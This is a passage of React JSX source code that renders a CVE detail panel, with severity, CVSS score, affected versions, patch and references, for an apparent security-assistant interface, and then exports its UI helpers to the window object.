            <div style={{background:'rgba(204,48,16,.05)',border:`1px solid ${C.brd}`,padding:'10px 12px',marginBottom:'14px'}}>
              <div style={{fontSize:'9px',color:C.dim,marginBottom:'8px',letterSpacing:'.13em',textTransform:'uppercase',fontWeight:700,fontFamily:"'JetBrains Mono',monospace"}}>SEVERITY ASSESSMENT</div>
              <div style={{display:'flex',justifyContent:'space-between',alignItems:'center',marginBottom:'12px'}}>
                <SeverityTag severity={cveData.severity} size="md"/>
                <span style={{fontSize:'9px',color:C.dim,fontFamily:"'JetBrains Mono',monospace"}}>{cveData.published}</span>
              </div>
              <CVSSBar score={cveData.cvss}/>
            </div>
            <MetaRow label="Description" value={cveData.description}/>
            <MetaRow label="Affected" value={cveData.affected}/>
            <MetaRow label="Fix / Patch" value={cveData.patch}/>
            <MetaRow label="CVSS Vector" value={cveData.vector} mono/>
            <div style={{fontSize:'9px',color:C.dim,letterSpacing:'.13em',textTransform:'uppercase',marginBottom:'7px',fontWeight:700,fontFamily:"'JetBrains Mono',monospace"}}>REFERENCES</div>
            {cveData.references.map((r,i)=><RefLink key={i} label={r.label} url={r.url}/>)}
          </div>
        )}
      </div>
    </div>
  );
}

Object.assign(window,{
  C,CVE_DATABASE,SEVERITY_CONFIG,SeverityTag,Brackets,
  extractCVEs,formatRelativeTime,estimateTokens,
  renderMarkdown,renderInline,getDemoResponse,
  Sidebar,CVEPanel,MOCK_CONVERSATIONS,
});
